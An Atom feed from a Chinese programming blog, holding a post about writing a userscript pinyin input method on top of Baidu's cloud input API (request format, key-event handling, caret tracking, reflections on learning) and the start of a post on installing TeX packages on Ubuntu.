<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[Reverland的行知阁]]></title>
  <subtitle><![CDATA[开放、分享、自由与进步]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="http://reverland.org/"/>
  <updated>2015-11-24T16:11:38.721Z</updated>
  <id>http://reverland.org/</id>
  
  <author>
    <name><![CDATA[Liu Yuyang]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[百度云输入法Userscript——实践和思考]]></title>
    <link href="http://reverland.org/javascript/2015/11/24/web-based-input-method/"/>
    <id>http://reverland.org/javascript/2015/11/24/web-based-input-method/</id>
    <published>2015-11-24T10:07:23.000Z</published>
    <updated>2015-11-24T16:11:38.721Z</updated>
    <content type="html"><![CDATA[<p>two days’ dirty hack，很多天之前写的一个利用百度云输入法的Userscript，没有你们想得这么高大上两天自己开发了个输入法ORZ。。。</p>
<p>2015.10.18 23:32, 首发<a href="http://www.jianshu.com/p/5e56524c91fc" target="_blank" rel="external">简书</a>。</p>
<p>我想总结下在写这个过程中学到了些什么。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/927981-0133862b083c1a93.gif" alt="baiducloudinput_first_edition-2.gif"></p>
<h2 id="综述">综述</h2><p>设计很简单，简单分为网络请求-用户界面-控制逻辑三部分。</p>
<h2 id="网络请求">网络请求</h2><p>原理非常简单。简单分析下百度云输入法，关键在这么一个请求</p>
<pre><code>http://olime.baidu.com/py?input=shuru&amp;inputtype=py&amp;bg=<span class="number">0</span>&amp;ed=<span class="number">20</span>&amp;<span class="literal">result</span>=hanzi&amp;resultcoding=unicode&amp;ch_en=<span class="number">0</span>&amp;clientinfo=web&amp;version=<span class="number">1</span>
</code></pre><p>其中参数也很清晰，其中参数<code>input</code>后面是输入的拼音，<code>inputtype</code>是输入法类型(<code>py</code>代表拼音)。<code>bg</code>代表begin，<code>ed</code>代表end，后面是啥管它呢。。。</p>
<p>这个请求会返回一个json，该json包含<code>shuru</code>这个拼音对应的结果，通过bg和ed能指定返回的范围。</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;"<span class="attribute">status</span>":<span class="value"><span class="string">"T"</span></span>,"<span class="attribute">errno</span>":<span class="value"><span class="string">"0"</span></span>,"<span class="attribute">errmsg</span>":<span class="value"><span class="string">""</span></span>,"<span class="attribute">result</span>":<span class="value">[[[<span class="string">"\u8f93\u5165"</span>,<span class="number">5</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu'ru"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"IMEDICT"</span></span>&#125;],[<span class="string">"\u9f20\u5973"</span>,<span class="number">5</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu'ru"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"NEWWORD"</span></span>&#125;],[<span class="string">"\u672f\u5112"</span>,<span class="number">5</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu'ru"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"NEWWORD"</span></span>&#125;],[<span class="string">"\u6dd1\u5982"</span>,<span class="number">5</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu'ru"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"IMEDICT"</span></span>&#125;],[<span class="string">"\u7ad6\u5112"</span>,<span class="number">5</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu'ru"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"IMEDICT"</span></span>&#125;],[<span class="string">"\u9f20\u4e73"</span>,<span class="number">5</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu'ru"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"IMEDICT"</span></span>&#125;],[<span class="string">"\u6691\u6ebd"</span>,<span class="number">5</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu'ru"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"IMEDICT"</span></span>&#125;],[<span class="string">"\u83fd\u4e73"</span>,<span class="number">5</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu'ru"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"IMEDICT"</span></span>&#125;],[<span class="string">"\u67a2\u5112"</span>,<span class="number">5</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu'ru"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"IMEDICT"</span></span>&#125;],[<span class="string">"\u6f8d\u6fe1"</span>,<span class="number">5</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu'ru"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"IMEDICT"</span></span>&#125;],[<span class="string">"\u758f\u8339"</span>,<span class="number">5</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu'ru"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"IMEDICT"</span></span>&#125;],[<span class="string">"\u4e66"</span>,<span class="number">3</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"CHAINFIND_RES"</span></span>&#125;],[<span class="string">"\u6570"</span>,<span class="number">3</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"CHAINFIND_RES"</span></span>&#125;],[<span class="string">"\u5c5e"</span>,<span class="number">3</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"CHAINFIND_RES"</span></span>&#125;],[<span class="string">"\u6811"</span>,<span class="number">3</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"CHAINFIND_RES"</span></span>&#125;],[<span class="string">"\u672f"</span>,<span class="number">3</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"CHAINFIND_RES"</span></span>&#125;],[<span class="string">"\u8f93"</span>,<span class="number">3</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"CHAINFIND_RES"</span></span>&#125;],[<span class="string">"\u8212"</span>,<span class="number">3</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"CHAINFIND_RES"</span></span>&#125;],[<span class="string">"\u6055"</span>,<span class="number">3</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"CHAINFIND_RES"</span></span>&#125;],[<span class="string">"\u53d4"</span>,<span class="number">3</span>,&#123;"<span class="attribute">pinyin</span>":<span class="value"><span class="string">"shu"</span></span>,"<span class="attribute">type</span>":<span class="value"><span class="string">"CHAINFIND_RES"</span></span>&#125;]],<span class="string">"shu'ru"</span>]</span>&#125;</span><br></pre></td></tr></table></figure>
<p>所以，最后Userscript的核心简单来说就是:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> ret = GM_xmlhttpRequest(&#123;</span><br><span class="line">    method: <span class="string">"GET"</span>,</span><br><span class="line">    url: <span class="string">`http://olime.baidu.com/py?input=<span class="subst">$&#123;IME.inputString&#125;</span>&amp;inputtype=py&amp;bg=0&amp;ed=100&amp;result=hanzi&amp;resultcoding=unicode&amp;ch_en=0&amp;clientinfo=web&amp;version=1`</span>,</span><br><span class="line">    onload: <span class="function"><span class="keyword">function</span>(<span class="params">res</span>) </span>&#123;</span><br><span class="line">      <span class="comment">//console.log("[DEBUG connect]")</span></span><br><span class="line">      resolve(res.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">p.then(parseJSON).then(parseRes, printError);</span><br></pre></td></tr></table></figure>
<p><code>parseRes</code>完成对返回json文件的解析，并更新用户界面，存储信息到输入法内部状态。</p>
<h2 id="用户界面。">用户界面。</h2><p>如果说还有什么比较恶心的事情，就是用户界面。一个简单的输入法用户界面显示如下</p>
<pre><code><span class="code">--------------------
shuru               |&lt;---输入提示(已经输入的内容)
--------------------\
1. 选择1             |
2. 选择2             |
3. 选择3             | &lt;----选择列表
4. 选择4             |
5. 选择5             |
---------------------</span>
</code></pre><p>好像也简单的不行。。。</p>
<p>这个用户界面应该有些良好的特性：</p>
<ol>
<li>跟随当前输入文本框光标的位置。</li>
<li>随着按键作出相应更新和变化。</li>
</ol>
<h2 id="控制逻辑">控制逻辑</h2><p>控制逻辑简单来说就是一个有穷状态自动机，监听各种按键然后根据输入法自身状态进行下一步。</p>
<p>输入法对象有些必须的基本状态：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> IME = &#123;</span><br><span class="line">  status: <span class="string">'hidden'</span>,</span><br><span class="line">  inputString: <span class="string">''</span>,</span><br><span class="line">  TEXTS: [],</span><br><span class="line">  page: <span class="number">0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>status</code>: 表征输入法状态，主要是界面状态。</li>
<li><code>inputString</code>：存储已输入数据——输入法缓存的未处理数据。</li>
<li><code>TEXTS</code>： 用来存储百度云输入法返回后解析得到的候选词列表。</li>
<li><code>page</code>: 存储页码，将用来决定显示<code>TEXTS</code>的哪些部分。</li>
</ul>
<p>接下来就是逻辑，我虽然不知道有穷状态自动机是什么鬼，每次面试都被虐成渣，但混乱的逻辑依然把逻辑写出来了，请观者自行优化：</p>
<ol>
<li>页面加载完成后，输入法界面初始化(插入页面)，初始化状态为未显示状态。</li>
<li>检测是否有输入，如果当前是未显示状态，变成显示状态。更新界面上输入提示，向百度发出请求。解析百度返回的json文件，存储TEXTS，更新选择列表。</li>
<li>继续监听用户输入：<ol>
<li>如果是空格或数字键1-5，在输入目标光标处插入对应文本或更改选中文本。status变为不显示，重置状态。</li>
<li>如果是翻页按键，更新page，更新选择列表。</li>
<li>如果是字符按键，则更新输入提示，并继续发送请求，解析返回的json文件，更新内部存储的TEXTS，更新选择列表。</li>
<li>如果是回车键，将输入提示在输入目标光标处插入或更改选中文本。状态改为不显示，重置状态。</li>
<li>如果是退格键，更新输入提示，并继续发送请求，解析返回的json文件，更新内部存储的TEXTS，更新选择列表。<ol>
<li>如果输入提示中没有内容更新显示状态为消失，重置状态。</li>
</ol>
</li>
</ol>
</li>
</ol>
<p>很简单。。。就是这么简单。</p>
<h2 id="其他">其他</h2><p>接下来说一些实践者才会碰到的问题。</p>
<h3 id="按键监听">按键监听</h3><p>我们都知道，你可以在<code>textarea</code>或者<code>input</code>上监听<code>keydown</code>、<code>keyup</code>、<code>keypress</code>事件来监听各种按键。</p>
<p>只有实践者才知道这简单描述后日了狗的现状。</p>
<h3 id="按键冲突">按键冲突</h3><p>首先，你想跟系统或者其他软件按键绑定冲突么，你监听个<code>alt</code>试试…我这里可以监听到，但ubuntu unity也会被触发。。。结果就是，如果你尝试绑定<code>Alt+F</code>这种快捷键基本上会被firefox直接劫持根本不会监听到F的按下。</p>
<h3 id="用多个层次的事件监听不同按键">用多个层次的事件监听不同按键</h3><p>其次，我会告诉你<a href="http://devdocs.io/dom_events/keydown" target="_blank" rel="external"><code>keydown</code></a>是不能区分大小写的，而<a href="http://devdocs.io/dom_events/keypress" target="_blank" rel="external"><code>keypress</code></a>是可以的。但后者却不能监听非输入字符。参考以下firefox中例子：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$p.addEventListener(<span class="string">"keypress"</span>,e=&gt;<span class="built_in">console</span>.log(e))</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">$p.addEventListener(<span class="string">"keyup"</span>,e=&gt;<span class="built_in">console</span>.log(e))</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">$p.addEventListener(<span class="string">"keydown"</span>,e=&gt;<span class="built_in">console</span>.log(e))</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line"><span class="comment">// 当我按下a时，输入A时</span></span><br><span class="line">keydown charCode=<span class="number">0</span>, keyCode=<span class="number">65</span></span><br><span class="line">keypress charCode=<span class="number">65</span>, keyCode=<span class="number">0</span></span><br><span class="line">keyup charCode=<span class="number">0</span>, keyCode=<span class="number">65</span></span><br><span class="line"><span class="comment">// 当我按下Caps Lock时</span></span><br><span class="line">keydown charCode=<span class="number">0</span>, keyCode=<span class="number">20</span></span><br><span class="line">keyup charCode=<span class="number">0</span>, keyCode=<span class="number">20</span></span><br><span class="line"><span class="comment">// 当我按下a时，输入a时</span></span><br><span class="line">keydown charCode=<span class="number">0</span>, keyCode=<span class="number">65</span></span><br><span class="line">keypress charCode=<span class="number">97</span>, keyCode=<span class="number">0</span></span><br><span class="line">keyup charCode=<span class="number">0</span>, keyCode=<span class="number">65</span></span><br></pre></td></tr></table></figure>
<p>可以看到<code>keypress</code>对象中的<code>charCode</code>属性很好的反映了真正的输入字符。而<code>keydown</code>或者<code>keyup</code>则用在监听非输入字符上。(似乎最开始也是这么设计的)</p>
<p>所以，我这里最后采用了分层的事件处理机制(扯的这么高大上实际上就是允许绑定多个事件顺序触发)来监听不同按键，分层执行逻辑。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tt.addEventListener(<span class="string">'keydown'</span>, checkNonCharacter);</span><br><span class="line">tt.addEventListener(<span class="string">'keyup'</span>, reqAndRefresh);</span><br><span class="line">tt.addEventListener(<span class="string">'keypress'</span>, intercept);</span><br></pre></td></tr></table></figure>
<p>另外，chromium和firefox的事件对象稍有差别，注意下就好。</p>
<h3 id="事件捕获">事件捕获</h3><p>当你截获按键之后，<em>必须</em> 要考虑清楚是否要阻止目标捕获该按键。比如我们用回车将输入提示内容输入到textarea光标位置后，显然不希望textarea捕获回车再来个换行。结果就是，上面简洁的逻辑过程有了很多真正使用时才发现的细节逻辑错误，接着就是靠各种判断来fix(dirty hack)。</p>
<p>参照以下退格键的例子，我们只想在输入法输入提示上回删，不希望在textarea或者input中也发生回删。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (<span class="built_in">String</span>.fromCharCode(e.which)) &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="built_in">String</span>.fromCharCode(<span class="number">8</span>): <span class="comment">// 退格</span></span><br><span class="line">   e.preventDefault();</span><br><span class="line"></span><br><span class="line">   IME.inputString = IME.inputString.substr(<span class="number">0</span>, IME.inputString.length - <span class="number">1</span>);</span><br><span class="line">   <span class="keyword">if</span> (IME.inputString.length == <span class="number">0</span>) &#123;</span><br><span class="line">     IME.status = <span class="string">'hidden'</span>;</span><br><span class="line">     showImePop(<span class="literal">false</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h3 id="文本内容更新">文本内容更新</h3><p>怎么更新textarea或者input内的内容呢。有两种情况：</p>
<ol>
<li>在光标后插入，并把光标置于更新文字之后</li>
<li>替换选中文字，并把光标置于替换后文字之后</li>
</ol>
<p>实际上，输入框（textarea或者input）元素提供了<code>selectionStart</code>和<code>selectionEnd</code>属性来读取选择文本的开始和结束，如果没有选中文字，则两个值一样都为光标现在所在位置。所以，根据这两个值更新内容和光标位置就行。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> curStart = tt.selectionStart;</span><br><span class="line"><span class="keyword">var</span> curEnd = tt.selectionEnd;</span><br><span class="line"><span class="keyword">var</span> selectedText = imePop.querySelector(<span class="string">'ol'</span>).children[index].textContent; <span class="comment">// 这个是选中的词语</span></span><br><span class="line">tt.value = tt.value.substring(<span class="number">0</span>, curStart) + selectedText + tt.value.substring(curEnd, tt.value.length);</span><br><span class="line">tt.selectionStart = curStart + selectedText.length;</span><br><span class="line">tt.selectionEnd = curStart + selectedText.length;</span><br></pre></td></tr></table></figure>
<h3 id="输入法UI跟随">输入法UI跟随</h3><p>好的输入法，应该时刻跟随在输入光标附近。我们不希望输入法UI一直在屏幕最上方而是能够一直跟随在光标位置附近。</p>
<p>遗憾的是，并没有什么好的方法能定位光标相对于文本框的位置。好在天才灵动的前端人有的是<a href="https://github.com/component/textarea-caret-position/blob/master/index.js" target="_blank" rel="external">黑魔法</a>。简单来说，就是添加一个不可见的<code>div</code>，将<code>textarea</code>的属性复制过去使他们几何上看上去一样。在把光标位置之前文本复制过去，在文本之后加入一个<code>span</code>标签，获取这个<code>span</code>标签相对与该<code>div</code>位置，也就获得了光标相对于文本框的位置。当然位置获取后就把这个镜像<code>div</code>删除掉了。</p>
<p>接下来，<a href="http://www.quirksmode.org/js/findpos.html" target="_blank" rel="external">根据光标相对文本框的位置可以计算出光标相对于文档(<code>document.body</code>)的位置</a>，依此我们可以设置输入法UI插入到文档内并设置绝对位置(<code>absolute</code>)。</p>
<p>这样就实现了输入法UI跟随输入光标。</p>
<h3 id="智能边界">智能边界</h3><p>我再之前提到的<a href="http://reverland.org/javascript/2015/11/17/greasemonkey-userscript/">取词Userscript脚本</a>中使用了这项功能，而实际上呢，这个东西来源于几个月前跟着《30天实现操作系统》写操作系统界面处理拖动窗口时的实践。</p>
<p>话说，很多次面试我都说我写了个操作系统玩，然后面试官就睁大眼睛那我问问你进程管理，我说啥叫进程管理，然后就没有然后了。。。做了没什么卵用的东西挺多，但是，那里学到的处理窗口在边界的方法倒真用上了。顺便一说facebook的react虚DOM，应该对看过《30天瞎逼写操作系统》的同学也很眼熟。</p>
<p>说得这么高大上，实际上就是如果检测到界面超出窗口范围就平移到窗口内。233</p>
<p>获取元素相对viewport位置参考<a href="http://devdocs.io/dom/element/getboundingclientrect" target="_blank" rel="external">getBoundingClientRect</a>，我昨天在<a href="http://eloquentjavascript.net/13_dom.html" target="_blank" rel="external">Eloquent Javascript</a>中看到了这个。当然，也许你不想插入元素之后再获取位置再变更位置，我目前也不知道怎样已知相对文档位置判断相对viewport位置。劳烦熟悉的、专业的朋友在评论中给我指正。(也许得减下<code>pageYOffset</code>吧，我猜233)</p>
<p>另外，如果你监听鼠标或触摸事件，那个事件有个<code>clientX</code>和<code>clientY</code>属性也是相对于viewport。比如取词的场景中，监听到鼠标按键弹起，判断在<code>clientX</code>和<code>clientY</code>位置生成一个弹出框会不会超出viewport范围(也许是<code>window.innerWidth</code>和<code>window.innerHeight</code>)，这样也能实现在边界的智能平移行为。</p>
<p>其实输入法脚本中还没实现这个。我感觉<a href="http://stackoverflow.com/questions/21064101/understanding-offsetwidth-clientwidth-scrollwidth-and-height-respectively" target="_blank" rel="external">这些API挺乱</a></p>
<h3 id="现实并不简单">现实并不简单</h3><p>事件绑定冲突。考虑以下情况：</p>
<ol>
<li>比如devdocs这种网页应用，网页在body或者哪里绑定了按键监听，并且不让接下来的元素捕获了。</li>
<li>网页神奇的用DOM level1的方式比如<code>textarea1.onkeydown = function(e){console.log(&quot;233，失效了吧&quot;)}</code>来监听</li>
<li>简书这种根据用户交互用js操作页面的，忽然出现了一个textarea然而我们输入法只在第一次页面加载时在输入框上绑定。</li>
<li>知乎这种页面，输入框并不是textarea或者input，而是div你敢信。。。</li>
</ol>
<p>总之，真正一个跨页面可用程序，大概各种监听DOM变化，启发式搜索输入框，对事件绑定进行重排等等黑魔法，这。。。就不在本文的探讨范围内了。</p>
<p>另外，UI也最好明确指定高度宽度，不然，如果跟随内容变化，那么比如选择列表从无到有时界面会有大幅抖动，当然，UI设计和前端细节什么的，也不是我这个前端渣渣有能力讨论的了。</p>
<h2 id="思考">思考</h2><p>作为一个不务正业的非专业拉圾前端，不是professional app开发者的瞎逼写少年。我做了很多没卵用的东西，从Photomosaic生成器到仿Shodan设备搜索引擎，从拥抱machine learning的shellcode检测到项目中瞎逼搞的安全shell……等等等等。经常直接上手挑战各种根本我自己都不知道是什么的东西，缺乏专业素养也就算了，learning from the ground也就算了，写出渣一样的东西也就算了，性能优化数据结构算法都现学转眼还忘了也就算了，被当成sb也就算了，</p>
<p>但，我玩得很开心啊。</p>
<p>这世界太险恶了，不同的人有不同的用心，我这种渣号称全栈的权利都被剥夺的一干二净。有些人总绞尽脑汁想着如何能从别人身上搜刮更多，有些人则在支持帮助他人的过程中最终成就了自己。他们将各得命运，谢谢后者，去你妈的前者。</p>
<h3 id="思考和实践">思考和实践</h3><p>说说对思考与实践的关系。</p>
<p>我经常做之前没做过的事情，所以，往往觉得困难重重。在这个过程中，慢慢也磨砺了自己搜集信息和判断问题的能力。但因为没有经验，总是还会走各种弯路。</p>
<p>所以每次做完什么都想，如果动手之前我多想一想，想好了，再写就会顺利很多。不致于在一些简单的问题上挣扎很久。</p>
<p>但另一方面，你想再久，大多数问题也只会在你碰到之后才浮现出来，因为你根本就不知道你将面对什么。再多他人的经验都是浮云，要么你不理解，要么根本不符合场景，要么你碰到才想起来。除非，你就重复了下别人做过的事情，那都不一定能顺利。</p>
<p>我想，这就是人生。所以多想还是多做？永远没有答案，想、做、想、做，理论和实践螺旋上升。</p>
<p>你可以吸取他人的经验，但不可能重复他人的人生，或者你真的愿意仅仅跟随？我个人觉得，只有在摔得半死不活的时候，才能明白他人留下的经验再说什么，不然盲从经验仅仅是束缚。</p>
<p>我忽然想到毛姆在《人生的枷锁》中的观点，我想这观点也束缚了我之后几年的态度和选择，也许还会束缚未来几年甚至一生。想到这里，背后直觉一阵冷汗。</p>
<p style="color: wheat;">叹人间，美中不足今方信。</p>

<h3 id="基础知识和复杂逻辑">基础知识和复杂逻辑</h3><p>基本上，我做什么东西都是现学，强行在复杂逻辑中现学基础。</p>
<p>经常想，如果之前，我把xxx先学好了，就会少走这多少弯路了。</p>
<p>然而这是个伪命题，我没真正想做什么需要去学什么，大概也不会记得自己学过什么。顺便说自己做过的东西都因为接触太多会忘得几乎一干二净，何况那种所谓“系统学习过的呢？”。我的第一门认真学的语言是common lisp，然而在几天前兴致盎然忽然回头看之前甚至连括号之外的语法都不记得了。我都不敢相信当时还用common lisp写过web server，做过DSL，搞过人工智能网页游戏？</p>
<p>但我记得很清楚，<em>lazy evaluation</em> ，我觉得面对复杂世界的学习过程也该这样，lazy是一种策略：）</p>
<p>正如<a href="http://blog.xen0n.name/" target="_blank" rel="external">Xenon</a>那个“云破月来”的一起膜蛤的夜晚对我说的，也许你忘记的东西，都内化为自己的一部分了吧哈哈哈。</p>
<p>真正重要的，应该是学习的能力而不是知识本身。</p>
<p>我想，未来是属于掌握渔而不是掌握鱼的人。</p>
<p>再复杂的东西，不是一步一步构建的吗？不要因为某些自以为的专家搞得好像多高深似的。</p>
<p>如果你对此心存疑问，建议看看<a href="http://neuralnetworksanddeeplearning.com/" target="_blank" rel="external">Neural Network and Deep Learning</a>这本书。看看为什么很多似乎凭空而来复杂概念最初是怎么来的，看看我们人类整体面对复杂世界的无力感。也许你不做神经网络也不搞深度学习，但是它将enlighten you.</p>
<p>重要的从来不是知识，而是我们如何得到发展知识。</p>
<p>可惜估计谁也没办法考察你的这项能力。只能你自己觉得233</p>
<h3 id="Last_But_Not_Least">Last But Not Least</h3><p>有两本非常喜欢的书：《Land of Lisp》和《Eloquent Javascript》。</p>
<p>然而世人一般喜欢看两种书：</p>
<ol>
<li>21天精通xx系列</li>
<li>xx导论/xx权威指南/xx精粹/xx高级xx/你不知道的XX</li>
</ol>
<p>请自行对号入座。</p>
<p>人生苦短，我就是不看。找不到工作拉倒。我不至于因为有谁告诉我该看去看，hacking对我也不仅仅是混饭这么简单。</p>
<p>我对第二类书的作者致以崇高的敬意，但并不代表，就一定得去看什么什么的。有缘的终会有缘，该看的终会去看。</p>
<p>每次看网上有人问我想学XX，我该如何XX.都有人说你去读XX读XXfollowXX就怎样怎样。我都觉得好笑，不是笑觉得错了，而是觉得，情怀呢？</p>
<p>当然，情怀是不能当饭吃的。</p>
<p>所以，有次面试，面试官说再看看YDKJS应付面试没问题了，当时就想喷他，虽然并没有只是微笑地看着他。</p>
<p>现在喷：）<em>你当我看什么看什么写什么学什么是为了应付面试糊弄工作？</em>，你看过<a href="http://phrack.org/" target="_blank" rel="external">phrack magazine</a>么，那上面经常说，</p>
<blockquote>
<p>for fun and profit</p>
</blockquote>
<p>这些年，也积极参与了很多很多活动。但越来越反感某些活动的宣传方式。当然，只是反感而已，毕竟活动组织费心费力又费钱，他们也未必没有吹嘘的本钱。反感谁就不说了，一般这种我也不会去，我也不会有机会去。。。作为loser门票都买不起：（</p>
<p>有些另外的活动则非常喜欢，只在这里向我非常感谢的活动组织方致以谢意：红帽中国Jboss User Group、360奇舞团。感谢精彩的分享和热情的招待。</p>
<p>我想对所有能看到这里的读者说，我不相信那些声称自己多xx多xx拯救世界颠覆宇宙，离地两万英尺飞来飞去的牛皮。如果见有人声称他们多牛逼能做到别人做不到的东西，他们头上光环无数出身高贵血统优良，我想说。</p>
<p><em>我们所有人，都是平等的，一样的。只因为不同人对我们的希求不同而体现出看似不同的价值，因此体现出优秀和差劲的差别。</em></p>
<p>无论境况比他人好或坏，我们都不比他人优越和差劲。</p>
<p>引用[Eloquent Javascript]中的一句话</p>
<blockquote>
<p>I’ve often felt that some human inventions were so immensely clever and complicated that I’d never be able to understand them. But with a little reading and tinkering, such things often turn out to be quite mundane.</p>
</blockquote>
<p>所以，除了物理条件限制，没有什么别人能做到而我不可能做到。计算机是个伟大的发明，让我们在其上超越物理限制有了平等的舞台。</p>
<p>引用我经常看到的一句话：</p>
<blockquote>
<p>限制你的只有你的想象力。</p>
</blockquote>
<p>请捍卫这个平等，<a href="https://my.fsf.org/donate/" target="_blank" rel="external">支持自由软件基金会</a>。</p>
<blockquote>
<p>to preserve, protect and promote the freedom to use, study, copy, modify, and redistribute computer software, and to defend the rights of Free Software users.</p>
</blockquote>
<p>至此，这篇瞎逼扯的文章变成一篇软文233。</p>
<p>最后奉上原始版本。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/927981-3d485a07ce9d5cd3.gif" alt="baiducloudinput_first_edition.gif"></p>
<p>写到这里好累，前前后后几个小时过去。文笔很乱也不加修改，如若能于其中有半点涟漪，也不负我在屏幕前的叹息了。</p>
<p>Have fun</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>two days’ dirty hack，很多天之前写的一个利用百度云输入法的Userscript，没有你们想得这么高大上两天自己开发了个输入法ORZ。。。</p>
<p>2015.10.18 23:32, 首发<a href="http://www.jianshu.com]]>
    </summary>
    
      <category term="javascript" scheme="http://reverland.org/tags/javascript/"/>
    
      <category term="javascript" scheme="http://reverland.org/categories/javascript/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[在linux下使用科技论文在线TeX模板]]></title>
    <link href="http://reverland.org/linux/2015/11/23/linux-tex/"/>
    <id>http://reverland.org/linux/2015/11/23/linux-tex/</id>
    <published>2015-11-23T14:50:01.000Z</published>
    <updated>2015-11-24T10:00:55.284Z</updated>
    <content type="html"><![CDATA[<p>原文2015.10.14 14:56 <a href="http://www.jianshu.com/p/1d4c06470960" target="_blank" rel="external">首发简书</a>。</p>
<p>我看到有tex模板。我用ubuntu 14.04LTS，并不用Office</p>
<p>下载下来是一个zip文件，解压。Readme.txt乱码</p>
<p><img src="http://upload-images.jianshu.io/upload_images/927981-81fbd592e5d1b0b9.png" alt="Screenshot from 2015-10-14 14:38:50.png"></p>
<p>抱着试试看的心理用 <code>iconv</code>转换</p>
<pre><code>iconv <span class="operator">-f</span> gbk -t utf8 Readme.txt
</code></pre><p>看到</p>
<p><img src="http://upload-images.jianshu.io/upload_images/927981-d48210cf5e804111.png" alt="Readme里信息"></p>
<p>基于ctex宏包开发，可以用pdflatex或者xelatex。我一直用xelatex，但不想装了。</p>
<pre><code>sudo apt-get <span class="operator"><span class="keyword">install</span> texlive-lang-cjk sudo apt-<span class="keyword">get</span> <span class="keyword">install</span> texlive-bibtex-extra</span>
